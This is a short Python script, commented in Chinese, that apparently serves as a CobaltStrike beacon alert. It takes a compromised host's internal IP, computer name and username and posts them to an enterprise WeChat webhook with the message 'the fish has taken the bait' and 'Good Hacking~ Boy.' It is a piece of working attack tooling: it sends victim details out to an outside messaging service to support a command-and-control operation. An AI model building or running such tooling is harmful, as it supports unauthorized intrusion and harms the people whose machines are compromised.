#coding: utf-8
import argparse
import requests
import random
import string
import json

key = 'xxxxxxxxx36位的一串'  
# 填入企业机器人hook地址
parser = argparse.ArgumentParser(description='Beacon Info')
parser.add_argument('--computername')
parser.add_argument('--internalip')
parser.add_argument('--username')
args = parser.parse_args()

computername = args.computername
internalip = args.internalip
username = args.username

ran_str = ''.join(random.sample(string.ascii_letters + string.digits, 8))

content = """
<font color=\"warning\">CobaltStrike 上线提醒</font>\n

**鱼上钩了 ！**\n

IP: <font color="comment">{}</font>\n

主机名: <font color="comment">{}</font>\n

用户名: <font color="comment">{}</font>\n

**Good Hacking~ Boy.**
""".format(internalip, computername, username)

# print(content)
url = "https://qyapi.weixin.qq.com/cgi-bin/webhook/send?key={}".format(key)
data = {
    "msgtype": "markdown",
    "markdown": {
        "content": content
    }
}
body=json.dumps(data).encode(encoding='utf-8')
headers = {'Content-Type':'application/json'}
requests.post(url,data=body,headers=headers)